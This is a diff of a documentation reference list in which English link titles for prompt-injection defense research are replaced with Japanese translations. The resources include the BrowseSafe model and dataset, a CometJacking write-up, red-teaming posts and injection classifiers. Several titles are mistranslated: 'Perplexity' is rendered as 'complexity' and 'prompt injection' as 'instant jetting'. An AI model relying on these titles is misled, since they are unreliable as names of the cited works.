+- [ブラウズセーフペーパー](https://research.perplexity.ai/articles/browsesafe)
+- [ブラウズセーフモデル](https://huggingface.co/perplexity-ai/browsesafe)
+- [BrowseSafe-Bench データセット](https://huggingface.co/datasets/perplexity-ai/browsesafe-bench)
+- [彗星突入](https://layerxsecurity.com/blog/cometjacking-how-one-click-can-turn-perplexitys-comet-ai-browser-against-you/)
+- [彗星の即時噴射の緩和](https://www.perplexity.ai/hub/blog/mitigating-prompt-injection-in-comet)
+- [レッドチームブラウズセーフ](https://www.lasso.security/blog/red-teaming-browsesafe-perplexity-prompt-injections-risks)
+- [メタエージェントの 2 つのルール](https://ai.meta.com/blog/practical-ai-agent-security/)
+- [自動モード分析 (サイモン ウィリソン)](https://simonwillison.net/2026/Mar/24/auto-mode-for-claude-code/)
+- [プロンプトインジェクション防御 (tldrsec)](https://github.com/tldrsec/prompt-injection-defenses)
+- [DeBERTa-v3-ベースプロンプトインジェクション-v2](https://huggingface.co/protectai/deberta-v3-base-prompt-injection-v2)
+- [DeBERTa ONNX バリアント](https://huggingface.co/protectai/deberta-v3-base-injection-onnx)
 - [@huggingface/transformers v4](https://www.npmjs.com/package/@huggingface/transformers)
-- [NDSS 2026 Paper](https://www.ndss-symposium.org/wp-content/uploads/2026-s675-paper.pdf)
-- [Multi-Agent Defense Pipeline](https://arxiv.org/html/2509.14285v4)
-- [Perplexity NIST Response](https://arxiv.org/html/2603.12230)
+- [NDSS 2026 論文](https://www.ndss-symposium.org/wp-content/uploads/2026-s675-paper.pdf)
+- [マルチエージェント防御パイプライン](https://arxiv.org/html/2509.14285v4)
+- [複雑性 NIST 応答](https://arxiv.org/html/2603.12230)
